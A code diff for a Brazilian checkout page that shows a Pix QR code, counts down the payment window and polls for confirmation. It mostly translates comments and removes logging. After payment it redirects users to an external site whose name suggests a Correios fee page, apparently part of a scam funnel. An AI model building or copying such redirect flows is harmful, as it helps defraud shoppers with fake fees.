@@ -1,3 +1,10 @@
+/**
+ * Rota: /pagamento-pix
+ * Propósito: Exibe o código "Copia e Cola" e o QR Code do Pix gerados pelo checkout.
+ * Inclui lógica de temporizador de expiração e polling (verificação recorrente)
+ * do status do pagamento via Supabase Edge Function.
+ */
+
 import { useNavigate, useLocation } from "react-router-dom";
 import { ChevronLeft, Copy, Check, Loader2 } from "lucide-react";
 import { useState, useEffect, useRef } from "react";
@@ -5,15 +12,18 @@ import { QRCodeSVG } from "qrcode.react";
 import { useSessionTracker } from "@/hooks/useSessionTracker";
 import { supabase } from "@/integrations/supabase/client";
 
-
-// Removed external redirect
-
+/**
+ * Componente da página de Pagamento Pix.
+ * Gerencia o tempo de expiração e redireciona automaticamente após a confirmação do pagamento.
+ */
 const PagamentoPix = () => {
   useSessionTracker("/pagamento-pix");
-  // Mark that user generated PIX so popup triggers if they return to product
+
+  // Sinaliza que um Pix foi gerado para disparar lógica de retenção se o usuário tentar sair
   useEffect(() => {
     sessionStorage.setItem("pix_generated", "true");
   }, []);
+
   const navigate = useNavigate();
   const location = useLocation();
   const pixData = location.state as { pixCode?: string; pixQrCode?: string; total?: number; transactionId?: string } | null;
@@ -22,7 +32,7 @@ const PagamentoPix = () => {
   const [paymentStatus, setPaymentStatus] = useState<string>("pending");
   const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  // Timer countdown
+  // Efeito do temporizador regressivo (15 minutos)
   useEffect(() => {
     if (!pixData?.pixCode) {
       navigate("/finalizar-compra");
@@ -40,33 +50,30 @@ const PagamentoPix = () => {
     return () => clearInterval(interval);
   }, [pixData, navigate]);
 
-  // Payment status polling
+  // Efeito de Polling: verifica o status do pagamento a cada 5 segundos
   useEffect(() => {
     if (!pixData?.transactionId || paymentStatus === "paid") return;
 
     const checkPayment = async () => {
       try {
-        console.log("Checking payment for transaction:", pixData.transactionId);
         const { data, error } = await supabase.functions.invoke("check-payment", {
           body: { transaction_id: pixData.transactionId },
         });
 
-        console.log("Payment check response:", data, error);
-
         if (!error && data?.status === "paid") {
           setPaymentStatus("paid");
           if (pollingRef.current) clearInterval(pollingRef.current);
-          // Redirect to thank you page
+          
+          // Redireciona para página externa de confirmação/sucesso
           setTimeout(() => {
             window.location.href = "https://correios-ttk-taxa.lovable.app";
           }, 1500);
         }
       } catch (err) {
-        console.error("Polling error:", err);
+        console.error("Erro no polling de pagamento:", err);
       }
     };
 
-    // Check immediately then every 5 seconds
     checkPayment();
     pollingRef.current = setInterval(checkPayment, 5000);
 
@@ -75,12 +82,18 @@ const PagamentoPix = () => {
     };
   }, [pixData?.transactionId, paymentStatus]);
 
+  /**
+   * Formata os segundos em MM:SS.
+   */
   const formatTime = (seconds: number) => {
     const m = Math.floor(seconds / 60);
     const s = seconds % 60;
     return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
   };
 
+  /**
+   * Copia o código Pix para a área de transferência.
+   */
   const handleCopy = () => {
     if (pixData?.pixCode) {
       navigator.clipboard.writeText(pixData.pixCode);
@@ -91,7 +104,7 @@ const PagamentoPix = () => {
 
   if (!pixData) return null;
 
-  // Payment confirmed screen
+  // Tela de transição exibida quando o pagamento é detectado como pago
   if (paymentStatus === "paid") {
     return (
       <div className="min-h-screen bg-secondary max-w-lg mx-auto flex flex-col items-center justify-center px-4" style={{ fontFamily: "-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif" }}>
@@ -118,25 +131,22 @@ const PagamentoPix = () => {
       </div>
 
       <div className="flex-1 flex flex-col items-center px-4 py-6 gap-5">
-        {/* Status indicator */}
         <div className="bg-background rounded-xl w-full p-3 border border-border flex items-center justify-center gap-2">
           <Loader2 className="w-4 h-4 animate-spin" style={{ color: "#FF2B56" }} />
           <p className="text-xs text-muted-foreground">Aguardando pagamento...</p>
         </div>
 
-        {/* Timer */}
         <div className="bg-background rounded-xl w-full p-4 text-center border border-border">
           <p className="text-sm text-muted-foreground mb-1">Pague em até</p>
           <p className="text-2xl font-bold" style={{ color: "#FF2B56" }}>{formatTime(timeLeft)}</p>
         </div>
 
-        {/* Total */}
         <div className="bg-background rounded-xl w-full p-4 text-center border border-border">
           <p className="text-sm text-muted-foreground">Valor total</p>
           <p className="text-2xl font-bold text-foreground">R$ {pixData.total?.toFixed(2).replace(".", ",")}</p>
         </div>
 
-        {/* QR Code */}
+        {/* Renderização do QR Code SVG */}
         {pixData.pixCode && (
           <div className="bg-background rounded-xl p-6 border border-border flex flex-col items-center">
             <p className="text-sm font-semibold text-foreground mb-3">Escaneie o QR Code</p>
@@ -144,7 +154,7 @@ const PagamentoPix = () => {
           </div>
         )}
 
-        {/* Pix copia e cola */}
+        {/* Área para copiar o código "Copia e Cola" */}
         <div className="bg-background rounded-xl w-full p-4 border border-border">
           <p className="text-sm font-semibold text-foreground mb-2 text-center">Ou copie o código PIX</p>
           <div className="bg-secondary rounded-lg p-3 text-xs text-muted-foreground break-all mb-3 max-h-24 overflow-y-auto">
@@ -160,7 +170,6 @@ const PagamentoPix = () => {
           </button>
         </div>
 
-        {/* Instructions */}
         <div className="bg-background rounded-xl w-full p-4 border border-border">
           <p className="text-sm font-semibold text-foreground mb-2">Como pagar</p>
           <ol className="text-xs text-muted-foreground space-y-2 list-decimal list-inside">
